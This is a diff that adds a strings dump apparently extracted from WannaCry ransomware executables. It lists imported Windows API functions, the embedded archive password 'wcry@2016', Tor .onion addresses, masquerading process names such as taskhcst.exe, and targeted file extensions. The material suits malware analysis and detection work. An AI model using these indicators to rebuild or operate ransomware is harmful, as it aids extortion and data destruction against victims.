@@ -1,0 +1,547 @@
+!This program cannot be run in DOS mode.
+rRichoR
+`.rdata
+@.data
+T$$SRUhH
+T$ WSRU
+<Wt!<wt
+l$8Uhd
+D$0RPWSUQ
+D$0RPWSUQ
+D$0RPWSUQ
+T$0QVh
+D$0RPWSUQ
+D$0RPWSUQ
+D$0RPWSUQ
+L$0PVhX
+D$0RPWSUQ
+D$0RVhL
+D$,WPS
+T$HQUR
+L$4ShT
+L$,Ph8
+GetModuleFileNameA
+CloseHandle
+WriteFile
+CreateFileA
+SizeofResource
+LockResource
+LoadResource
+FindResourceA
+MoveFileExA
+CreateProcessA
+InitializeCriticalSection
+LeaveCriticalSection
+EnterCriticalSection
+TerminateThread
+WaitForSingleObject
+GetCurrentThreadId
+GetCurrentThread
+GetTickCount
+ExitProcess
+WideCharToMultiByte
+MultiByteToWideChar
+GetLocalTime
+GetProcAddress
+GetLastError
+LoadLibraryA
+GetFileAttributesA
+CopyFileA
+CreateDirectoryA
+KERNEL32.dll
+CryptAcquireContextA
+CryptGenRandom
+SetServiceStatus
+ChangeServiceConfig2A
+RegisterServiceCtrlHandlerA
+StartServiceCtrlDispatcherA
+CloseServiceHandle
+OpenServiceA
+OpenSCManagerA
+DeleteService
+StartServiceA
+ControlService
+CreateServiceA
+ADVAPI32.dll
+WS2_32.dll
+NetApiBufferFree
+NetUserEnum
+NETAPI32.dll
+WNetCancelConnection2A
+WNetAddConnection2A
+MPR.dll
+_endthreadex
+strncpy
+sprintf
+_beginthreadex
+__CxxFrameHandler
+printf
+MSVCRT.dll
+_XcptFilter
+_acmdln
+__getmainargs
+_initterm
+__setusermatherr
+_adjust_fdiv
+__p__commode
+__p__fmode
+__set_app_type
+_except_handler3
+_controlfp
+GetModuleHandleA
+GetStartupInfoA
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+0@@AAJu
+SVWjA[
+t7KNNf9>t
+H43H 3H
+H83H$3H
+H<3H(3H
+H83H 3H
+H<3H$3H
+H(3H 3H
+H,3H$3H
+H03H(3H
+H43H,3H 3H
+H83H03H$3H
+H<3H4j
+H83H,3H
+H<3H03H
+H43H 3H
+H83H$3H
+H<3H(3H
+H83H 3H
+H<3H$3H
+H(3H 3H
+H,3H$3H
+H03H(3H
+H43H,3H 3H
+H83H03H$3H
+H<3H4j
+H83H,3H
+H<3H03H
+H43H 3H
+H83H$3H
+H<3H(3H
+H83H 3H
+H<3H$3H
+H(3H 3H
+H,3H$3H
+H03H(3H
+H43H,3H 3H
+H83H03H$3H
+H<3H4j
+H83H,3H
+H<3H03H
+H43H 3H
+H83H$3H
+H<3H(3H
+H83H 3H
+H<3H$3H
+H(3H 3H
+H,3H$3H
+H03H(3H
+H43H,3H 3H
+H83H03H$3H
+H<3H4j
+H83H,3H
+H<3H03H
+?vOj@_+
+QQSUVW
+^ j@US
+_^][YY
+Ht4HHt
+tlHt Ht
+~(9~$u
+FP;FTt
+k|_^][Y
+ inflate 1.1.3 Copyright 1995-1998 Mark Adler 
+Qkkbal
+- unzip 0.15 Copyright 1998 Gilles Vollant 
+CloseHandle
+ReadFile
+CreateFileA
+lstrcatA
+lstrcpyA
+DeleteFileA
+MoveFileA
+lstrlenA
+WriteFile
+SetFilePointer
+GetFileAttributesA
+GetTickCount
+LoadLibraryA
+SystemTimeToFileTime
+GetCurrentDirectoryA
+LocalFileTimeToFileTime
+CreateDirectoryA
+SetFileTime
+LocalFree
+GetLastError
+CreateMutexA
+GetComputerNameA
+WaitForSingleObject
+CreateProcessA
+CopyFileA
+WinExec
+FindClose
+FindFirstFileA
+GetTempFileNameA
+GetWindowsDirectoryA
+GetCurrentProcessId
+GetCurrentThreadId
+GetCurrentThread
+SetCurrentDirectoryA
+GetModuleFileNameA
+KERNEL32.dll
+wsprintfA
+USER32.dll
+SetSecurityInfo
+SetEntriesInAclA
+GetSecurityInfo
+ADVAPI32.dll
+??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
+??8std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z
+?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@PBDI@Z
+?_Tidy@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEX_N@Z
+?_C@?1??_Nullstr@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAPBDXZ@4DB
+?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@PBDI@Z
+?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ABV12@II@Z
+??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
+?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ABV12@II@Z
+?npos@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@2IB
+MSVCP60.dll
+memcmp
+??1exception@@UAE@XZ
+?what@exception@@UBEPBDXZ
+strlen
+__CxxFrameHandler
+memcpy
+_strlwr
+malloc
+realloc
+memset
+strrchr
+strcpy
+fwrite
+fclose
+sprintf
+strchr
+_purecall
+memmove
+??0exception@@QAE@ABV0@@Z
+??0exception@@QAE@ABQBD@Z
+_CxxThrowException
+strcat
+calloc
+strcmp
+strncpy
+??2@YAPAXI@Z
+_mbsstr
+MSVCRT.dll
+??1type_info@@UAE@XZ
+_XcptFilter
+_acmdln
+__getmainargs
+_initterm
+__setusermatherr
+_adjust_fdiv
+__p__commode
+__p__fmode
+__set_app_type
+_except_handler3
+_controlfp
+WS2_32.dll
+URLDownloadToFileA
+urlmon.dll
+DeleteUrlCacheEntry
+WININET.dll
+GetAdaptersInfo
+iphlpapi.dll
+GetModuleHandleA
+GetStartupInfoA
+_strnicmp
+.?AVexception@@
+memory
+NVIDIA
+Amazon
+360Safe
+Rising
+Tencent
+Mozilla
+Google
+Global\{
+9cc53f993e62ae52c62490e3e2f7bc667fa40ed3362108bc9d53501c195b7d8ab254beba95baa7244f149a66e8e2b5934f55f55c90e773909e20b3c68230e70c1a845824b904075363f83a13f22429ba92bd0036b18b5cd042105735a87e1d7127c7a6328ec7764194ad7a8e237b9ea8220299bebe7be8cb45fced0d3927c0f7
+incompatible version
+buffer error
+insufficient memory
+data error
+stream error
+file error
+stream end
+need dictionary
+invalid distance code
+invalid literal/length code
+invalid bit length repeat
+too many length or distance symbols
+invalid stored block lengths
+invalid block type
+incomplete dynamic bit lengths tree
+oversubscribed dynamic bit lengths tree
+incomplete literal/length tree
+oversubscribed literal/length tree
+empty distance tree with lengths
+incomplete distance tree
+oversubscribed distance tree
+incorrect data check
+incorrect header check
+invalid window size
+unknown compression method
+%s%s%s
+EVERYONE
+127.0.0.1
+tor.exe
+lsass.bin
+%s\%s\%s
+TaskHost
+taskhosts.exe
+ftp://
+https://
+http://
+taskhcst.exe
+mnses7nxf743znk7.onion
+r5x6sdigdz4q7f6q.onion
+sw7xmbms2ivmt5og.onion
+.?AVtype_info@@
+!This program cannot be run in DOS mode.
+Gl^AH1^
+Gm^2Gl^
+Gl^EAj^
+Gl^Rich
+`.rdata
+@.data
+@4+G4t
+q89p8t
+V,YYG;~
+tlHt Ht
+~(9~$u
+FP;FTt
+k|_^][Y
+=j&&LZ66lA??~
+}{))R>
+f""D~**T
+V22dN::t
+o%%Jr..\$
+&&Lj66lZ??~A
+99rKJJ
+==zGdd
+""Df**T~
+;22dV::tN
+$$Hl\\
+C77nYmm
+%%Jo..\r
+>!KK
+55j_WW
+&Lj&6lZ6?~A?
+~=zG=d
+"Df"*T~*
+2dV2:tN:
+x%Jo%.\r.
+t>!K
+a5j_5W
+ggV}++
+Lj&&lZ66~A??
+bS11*?
+Xt,,4.
+RRvM;;
+MMfU33
+PPxD<<%
+Bc!! 0
+~~zG==
+Df""T~**;
+dV22tN::
+xxJo%%\r..8$
+tt>!
+pp|B>>q
+aaj_55
+UUPx((
+='9-6d
+_jbF~T
+11#?*0
+,4$8_@
+t\lHBW
+QPeA~S
+>4$8,@
+p\lHtW
++HpXhE
+T[$:.6
+,4$8'9-6:.6$1#?*XhHpSeA~NrZlE
+Sbt\lH
+QeFbF~TiKwZ
+4$8,9-6'.6$:#?*1hHpXeA~SrZlN
+SbE\lHtQeF
+F~TbKwZi
+$8,4-6'96$:.?*1#HpXhA~SeZlNrSbE
+lHt\eF
+Q~TbFwZiK
+8,4$6'9-$:.6*1#?pXhH~SeAlNrZbE
+SHt\lF
+QeTbF~ZiKw
+ inflate 1.1.3 Copyright 1995-1998 Mark Adler 
+Qkkbal
+- unzip 0.15 Copyright 1998 Gilles Vollant 
+CloseHandle
+GlobalFree
+GetProcAddress
+LoadLibraryA
+GlobalAlloc
+SetCurrentDirectoryA
+GetCurrentDirectoryA
+GetFileAttributesA
+SetFileTime
+WriteFile
+SetFilePointer
+ReadFile
+GetFileSizeEx
+CreateFileA
+InitializeCriticalSection
+DeleteCriticalSection
+GetFileSize
+LeaveCriticalSection
+EnterCriticalSection
+SizeofResource
+LockResource
+LoadResource
+FindResourceA
+GetModuleFileNameA
+SetErrorMode
+VirtualAlloc
+VirtualFree
+FreeLibrary
+HeapAlloc
+GetProcessHeap
+GetModuleHandleA
+SetLastError
+VirtualProtect
+IsBadReadPtr
+HeapFree
+SystemTimeToFileTime
+LocalFileTimeToFileTime
+CreateDirectoryA
+KERNEL32.dll
+wsprintfA
+USER32.dll
+CryptAcquireContextA
+CryptImportKey
+CryptReleaseContext
+CryptDestroyKey
+CryptDecrypt
+ADVAPI32.dll
+SHELL32.dll
+OLEAUT32.dll
+WS2_32.dll
+iphlpapi.dll
+NETAPI32.dll
+MPR.dll
+strcpy
+memset
+strlen
+memcpy
+__CxxFrameHandler
+??3@YAXPAX@Z
+memcmp
+_except_handler3
+_local_unwind2
+??2@YAPAXI@Z
+sscanf
+strcmp
+__p___argv
+__p___argc
+strrchr
+realloc
+_stricmp
+malloc
+??0exception@@QAE@ABV0@@Z
+??1exception@@UAE@XZ
+??0exception@@QAE@ABQBD@Z
+_CxxThrowException
+calloc
+strcat
+_mbsstr
+MSVCRT.dll
+??1type_info@@UAE@XZ
+_XcptFilter
+_acmdln
+__getmainargs
+_initterm
+__setusermatherr
+_adjust_fdiv
+__p__commode
+__p__fmode
+__set_app_type
+_controlfp
+MSVCP60.dll
+GetStartupInfoA
+WANNACRY
+(}:6d*L
+W~!{WV
+Th*5\>Z
+n/{,`i
+inY8U+
+&Microsoft Enhanced RSA and AES Cryptographic Provider
+StartTask
+wcry@2016
+GetNativeSystemInfo
+kernel32.dll
+.?AVexception@@
+incompatible version
+buffer error
+insufficient memory
+data error
+stream error
+file error
+stream end
+need dictionary
+invalid distance code
+invalid literal/length code
+invalid bit length repeat
+too many length or distance symbols
+invalid stored block lengths
+invalid block type
+incomplete dynamic bit lengths tree
+oversubscribed dynamic bit lengths tree
+incomplete literal/length tree
+oversubscribed literal/length tree
+empty distance tree with lengths
+incomplete distance tree
+oversubscribed distance tree
+incorrect data check
+incorrect header check
+invalid window size
+unknown compression method
+%s%s%s
+.?AVtype_info@@
+c.wry0L
+m.wrys
+yBxT#U
+@LFV:=
+C(5Kd~#
+tJYAA.'
+1R7=tG+
+ucdWjb
+Tq;mvE
+[:Go0AI+
+)1c.%O
+s5/6Gy
+l=vNAj
+)LOSpN
+windows 2000 2195
+windows 2000 5.0
+.sqlite3
+.sqlitedb
+.accdb
+.class
+.backup
+.onetoc2
